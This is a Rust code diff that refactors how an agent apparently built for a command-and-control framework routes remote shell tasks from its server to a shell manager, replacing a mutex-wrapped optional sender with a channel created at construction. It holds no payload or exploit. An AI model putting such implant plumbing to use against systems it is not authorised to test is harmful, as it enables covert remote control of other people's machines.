@@ -26,7 +26,8 @@ pub struct ImixAgent<T: Transport> {
     pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
     pub output_tx: std::sync::mpsc::SyncSender<c2::ReportTaskOutputRequest>,
     pub output_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportTaskOutputRequest>>>,
-    pub shell_manager_tx: Arc<Mutex<Option<tokio::sync::mpsc::Sender<ShellManagerMessage>>>>,
+    pub shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
+    shell_manager_rx: Arc<Mutex<Option<tokio::sync::mpsc::Receiver<ShellManagerMessage>>>>,
 }
 
 impl<T: Transport + Sync + 'static> ImixAgent<T> {
@@ -37,6 +38,8 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         task_registry: Arc<TaskRegistry>,
     ) -> Self {
         let (output_tx, output_rx) = std::sync::mpsc::sync_channel(MAX_BUF_OUTPUT_MESSAGES);
+        let (shell_tx, shell_rx) = tokio::sync::mpsc::channel(100);
+
         Self {
             config: Arc::new(RwLock::new(config)),
             transport: Arc::new(RwLock::new(transport)),
@@ -45,19 +48,20 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             subtasks: Arc::new(Mutex::new(BTreeMap::new())),
             output_tx,
             output_rx: Arc::new(Mutex::new(output_rx)),
-            shell_manager_tx: Arc::new(Mutex::new(None)),
+            shell_manager_tx: shell_tx,
+            shell_manager_rx: Arc::new(Mutex::new(Some(shell_rx))),
         }
     }
 
     pub fn start_shell_manager(self: Arc<Self>) {
-        let (tx, rx) = tokio::sync::mpsc::channel(100);
+        let rx = self
+            .shell_manager_rx
+            .lock()
+            .unwrap()
+            .take()
+            .expect("Shell manager already started or receiver missing");
+
         let manager = ShellManager::new(self.clone(), rx);
-
-        {
-            let mut lock = self.shell_manager_tx.lock().unwrap();
-            *lock = Some(tx);
-        }
-
         self.runtime_handle.spawn(manager.run());
     }
 
@@ -292,11 +296,10 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
 
         if !resp.shell_tasks.is_empty() {
             has_work = true;
-            let lock = self.shell_manager_tx.lock().unwrap();
-            if let Some(tx) = &*lock {
-                for shell_task in resp.shell_tasks {
-                    let _ = tx.try_send(ShellManagerMessage::ProcessTask(shell_task));
-                }
+            for shell_task in resp.shell_tasks {
+                let _ = self
+                    .shell_manager_tx
+                    .try_send(ShellManagerMessage::ProcessTask(shell_task));
             }
         }
 
@@ -425,15 +428,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     }
 
     fn create_portal(&self, task_context: TaskContext) -> Result<(), String> {
-        let shell_manager_tx = {
-            let lock = self
-                .shell_manager_tx
-                .lock()
-                .map_err(|_| "Poisoned lock".to_string())?;
-            lock.clone()
-                .ok_or("Shell manager not initialized".to_string())?
-        };
-
+        let shell_manager_tx = self.shell_manager_tx.clone();
         self.spawn_subtask(task_context.task_id, move |transport| async move {
             run_create_portal(task_context, transport, shell_manager_tx).await
         })
